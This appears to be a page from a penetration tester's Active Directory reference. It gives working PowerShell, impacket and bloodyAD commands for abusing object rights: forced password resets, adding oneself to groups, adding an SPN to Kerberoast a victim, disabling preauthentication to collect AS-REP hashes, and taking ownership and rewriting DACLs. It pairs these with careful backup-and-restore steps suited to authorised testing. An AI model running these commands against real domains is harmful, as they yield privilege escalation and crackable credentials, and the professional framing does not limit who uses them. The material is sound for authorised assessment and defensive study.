# AD object rights and advanced paths

[← Active Directory quick reference](../05-active-directory.md) · [ACL discovery](spn-acl-shares.md#object-acls)

For each edge: principal + right + exact target + original value. Verify allow/deny, object-specific GUIDs, inheritance, active credential, and intended DC using [PowerView ACL checks](powerview.md#object-acls). A graph edge or generic rights label is a lead, not a restorable backup.

## User and group rights

| Right | Check or use |
| --- | --- |
| `ForceChangePassword` | Can you reset this user's password? |
| `GenericWrite` or `GenericAll` on a user | Can you change an SPN, pre-auth flag, or another useful attribute? |
| `GenericAll` on a group | Can you add your principal as a member? |
| `WriteOwner` or `WriteDACL` | Can you gain the needed edit right while preserving the original owner and ACL? |

Password reset and group membership:

```powershell
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
net group "Target Group" me /add /domain
```

Resetting a password does not reveal the old password and can affect encrypted user data and running services. Establish the intended consequence before using that right. For membership, save the original direct members and remove only a membership you added; see the [complete group proof](privileged-groups.md#account-operators-verify-a-useful-nonprotected-target).

## Targeted SPN: preserve existing values

With the AD module available and effective SPN-write permission confirmed:

```powershell
$DC = 'dc01.corp.example'
$Cred = Get-Credential -UserName 'CORP\operator' -Message 'Object read/write credential'
$Victim = Get-ADUser 'victim' -Server $DC -Credential $Cred -Properties servicePrincipalName -ErrorAction Stop
$OriginalSpns = @($Victim.servicePrincipalName | ForEach-Object { [string]$_ })
$Victim | Select-Object DistinguishedName,SID,servicePrincipalName |
    Export-Clixml '.\victim-spn-before.xml' -ErrorAction Stop
$ProofSpn = 'labproof/victim.corp.example'
setspn.exe -Q $ProofSpn
# Continue only if this unique value is absent and the backup/read right is confirmed.
Set-ADUser $Victim -Server $DC -Credential $Cred -ServicePrincipalNames @{Add=$ProofSpn} -ErrorAction Stop
```

```bash
impacket-GetUserSPNs -dc-ip <DC-IP> -request-user victim -outputfile victim-tgs.txt \
  'corp.example/operator'
```

Read back the changed SPN and the resulting ticket format. Remove only the added SPN afterward:

```powershell
Set-ADUser $Victim -Server $DC -Credential $Cred -ServicePrincipalNames @{Remove=$ProofSpn} -ErrorAction Stop
$After = @((Get-ADUser $Victim -Server $DC -Credential $Cred `
    -Properties servicePrincipalName -ErrorAction Stop).servicePrincipalName | ForEach-Object { [string]$_ })
$Unexpected = @($After | Where-Object { $OriginalSpns -notcontains $_ })
$Missing = @($OriginalSpns | Where-Object { $After -notcontains $_ })
if ($Unexpected.Count -or $Missing.Count) {
    Write-Warning 'SPN set differs from the backup; reconcile intervening changes.'
    $Unexpected
    $Missing
} else { 'Original SPN set restored, including an originally empty set.' }
```

Do not replace all SPNs with a single proof value; that can disrupt existing services. Preserve concurrent legitimate changes. [Set-ADUser multivalue operations](https://learn.microsoft.com/en-us/powershell/module/activedirectory/set-aduser), [GetUserSPNs options](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py).

## Targeted AS-REP: preserve the preauthentication flag

Read and save the exact `userAccountControl` value first. Confirm write permission for this attribute and that `DONT_REQ_PREAUTH` was originally absent. If it was already present, collect without changing/removing it.

```bash
bloodyAD -u me -p pass -d corp.example --host <dc-ip> add uac victim -f DONT_REQ_PREAUTH
impacket-GetNPUsers corp.example/victim -dc-ip <dc-ip> -no-pass -format hashcat
bloodyAD -u me -p pass -d corp.example --host <dc-ip> remove uac victim -f DONT_REQ_PREAUTH
```

Read back the flag and restore only the bit introduced by this test; compare the final attribute with the original. The username is a positional `GetNPUsers` target, whereas `-request-user` belongs to `GetUserSPNs`. [GetNPUsers source](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py).

## Owner and DACL paths

Confirm that taking ownership provides the expected effective DACL right. OWNER RIGHTS ACEs and BlockOwnerImplicitRights can change that result, particularly for computer-derived objects. [SpecterOps ownership analysis](https://specterops.io/blog/2025/03/26/do-you-own-your-permissions-or-do-your-permissions-own-you/).

Capture the original owner SID and a restorable DACL before edits:

```bash
impacket-owneredit -dc-ip <DC-IP> -action read -target victim 'corp.example/operator'
impacket-dacledit -dc-ip <DC-IP> -action backup -file victim-dacl.bak -target victim 'corp.example/operator'
# Only after recording the original owner SID and verifying the saved DACL:
impacket-owneredit -dc-ip <DC-IP> -action write -new-owner operator -target victim 'corp.example/operator'
```

Apply the smallest confirmed useful right, use it, then restore the DACL **before** restoring ownership if losing ownership would lose restore access:

```bash
impacket-dacledit -dc-ip <DC-IP> -action restore -file victim-dacl.bak 'corp.example/operator'
impacket-owneredit -dc-ip <DC-IP> -action write -new-owner-sid <ORIGINAL-OWNER-SID> \
  -target victim 'corp.example/operator'
impacket-owneredit -dc-ip <DC-IP> -action read -target victim 'corp.example/operator'
```

Check target DN/SID and security state afterward. Restoring an arbitrary earlier ACL can erase concurrent edits; reconcile them before applying a snapshot. [Impacket DACL tool](https://github.com/fortra/impacket/blob/master/examples/dacledit.py), [owner tool](https://github.com/fortra/impacket/blob/master/examples/owneredit.py).

## Sealed LDAP, object restore & newer primitives

`strongerAuthRequired`: use Kerberos/sealed LDAP or test LDAPS.

```bash
bloodyAD -u user -p pass -d corp.local --host dc01.corp.local get writable
```

Tombstone restore: write right on object + create-child in destination OU:

```bash
bloodyAD -u user -p pass -d corp.local --host dc01.corp.local set restore <deleted-object> \
  --newParent OU=Employees,DC=corp,DC=local
```

Shadow credentials need writable `msDS-KeyCredentialLink` + PKINIT. `KDC_ERR_PADATA_TYPE_NOSUPP` → check DC support.

BadSuccessor/dMSA: check DC patch state and rights over both dMSA and target. [Research](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) · [patch](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch).
